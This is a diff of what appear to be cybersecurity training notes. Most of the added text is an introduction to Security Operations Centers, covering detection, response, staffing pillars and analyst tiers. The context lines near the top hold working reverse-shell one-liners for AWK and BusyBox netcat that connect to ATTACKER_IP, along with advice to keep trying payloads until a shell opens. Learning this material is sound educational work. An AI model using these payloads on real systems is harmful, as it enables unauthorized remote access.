@@ -1931,9 +1931,6 @@ When standard scripting languages fail, you can try these alternative utilities.
 | **AWK** | `awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" \|& s; s \|& getline c; if(c){ while ((c \|& getline) > 0) print $0 \|& s; close(c); } } while(c != "exit") close(s); }}' /dev/null` | Abuses the built-in TCP networking capabilities of the AWK text processing tool. |
 | **BusyBox** | `busybox nc ATTACKER_IP 443 -e sh` | Commonly found on embedded systems and IoT devices. Uses a lightweight version of Netcat. |
 
-### Tools & Commands
-* *(Conceptual focus for this task; these are the exact payloads you will copy, modify, and paste into target systems).*
-
 ### Key Takeaways
 If a Bash reverse shell fails, don't give up! The server might have restricted outbound bash connections but left Python or PHP completely unrestricted. Always cycle through different payload types when trying to pop a shell.
 
@@ -1942,3 +1939,68 @@ If a Bash reverse shell fails, don't give up! The server might have restricted o
 **SQLMap**
 
 * SQLMap is an automated tool for detecting and exploiting SQL injection vulnerabilities in web applications. It simplifies the process of identifying these vulnerabilities. This tool is built into some Linux distributions, but you can easily install it if it's not.
+
+---
+
+## Room: [SOC Fundamentals]
+
+* Security Operations Center (SOC) is a team of IT security professionals tasked with monitoring, preventing, detecting, investigating, and responding to threats within a company's network and systems.
+
+* **Objective:** Understand the primary responsibilities of a Security Operations Center (SOC) and the three foundational elements required to make it mature and efficient.
+
+### 1. The Primary Focus: Detection and Response
+A SOC relies on continuous monitoring from a centralized location to keep the company's network secure. Their core mission is split into two main phases.
+
+
+
+**Phase 1: Detection**
+The SOC is constantly hunting for anomalies and weaknesses. This includes:
+* **Detecting Vulnerabilities:** Identifying unpatched software, operating systems, or programs before attackers can exploit them. 
+* **Detecting Unauthorized Activity:** Spotting compromised accounts (e.g., catching a login from an impossible geographic location using stolen employee credentials).
+* **Detecting Policy Violations:** Catching internal users breaking corporate security rules (e.g., downloading pirated media or emailing confidential files insecurely).
+* **Detecting Intrusions:** Identifying successful breaches, such as an exploited web server or an employee's computer getting infected with malware.
+
+**Phase 2: Response**
+Once a threat is detected, the SOC must act quickly to neutralize it.
+* **Incident Response Support:** The SOC helps contain the threat to minimize business impact and performs a root-cause analysis to figure out exactly how the incident occurred.
+
+---
+
+### 2. The Three Pillars of a SOC
+A SOC cannot function on software alone. To effectively detect and respond to incidents, a SOC must perfectly balance three critical elements:
+
+
+
+| Pillar | Description |
+| :--- | :--- |
+| **People** | A dedicated team of highly trained, professional security analysts and engineers. |
+| **Process** | The established rules, procedures, and playbooks that dictate exactly how the team should handle specific alerts and incidents to ensure compliance and efficiency. |
+| **Technology** | The state-of-the-art security solutions and centralized monitoring tools used to sift through massive amounts of network data. |
+
+**Key Takeaway:** You can buy the most expensive **Technology** in the world, but without the right **People** to configure it and the proper **Processes** to respond to its alerts, your SOC will inevitably fail.
+
+**People**
+
+* **Objective:** Understand why human analysts are essential to a Security Operations Center and learn the specific responsibilities of the different roles within the SOC hierarchy.
+
+### Key Concepts: The "Noise" Problem (Alert Fatigue)
+Security solutions and automated tools are great, but they generate a massive amount of "noise" (red flags/alerts). 
+* **The Fire Brigade Analogy:** If a city's automated fire alarm system alerts the fire department every time someone burns toast, the department wastes all its time and resources on false alarms. 
+* **The Human Element:** In a SOC, automated tools will flag a lot of harmless activity as "suspicious." It requires the **People** on the team to manually investigate these alerts, filter out the false positives, and identify the truly harmful activities.
+
+### The SOC Team Structure
+A mature SOC operates on a tiered escalation path. When an alert fires, it moves up the chain based on its severity and complexity.
+
+| Role | Primary Responsibilities |
+| :--- | :--- |
+| **SOC Analyst (Level 1)** | **The First Responders:** They perform the initial triage on every alert generated by the security tools to determine if it is a false positive or a real threat. If it's a real threat, they escalate it. |
+| **SOC Analyst (Level 2)** | **The Deep Divers:** They handle the escalated alerts from Level 1. They dive deeper into the investigation, correlating data from multiple sources (like firewalls, endpoints, and proxies) to perform a proper, comprehensive analysis. |
+| **SOC Analyst (Level 3)** | **The Threat Hunters & Responders:** Highly experienced professionals who *proactively* hunt for hidden threats that the automated tools missed. They also handle complex Incident Response (Containment, Eradication, Recovery) for critical breaches. |
+| **Security Engineer** | **The Builders:** They deploy, configure, and maintain the actual security solutions (SIEMs, Firewalls, EDRs) to ensure they operate smoothly and ingest data correctly. |
+| **Detection Engineer** | **The Rule Makers:** They write the custom logic and security rules that power the automated tools, telling the software exactly what malicious activity looks like. *(Note: L2 or L3 analysts sometimes wear this hat).* |
+| **SOC Manager** | **The Leader:** Manages the team's processes, oversees daily operations, and reports the overall security posture and metrics up to the executive level (the CISO). |
+
+### Key Takeaways
+If you are aiming for a career as a SOC Analyst, you will almost certainly start at **Level 1**. Your primary job will be "Alert Triage"—quickly looking at an automated warning and deciding: "Is this just a user forgetting their password 5 times, or is this an attacker trying to brute-force an account?"
+
+[CONTINUED LATER]
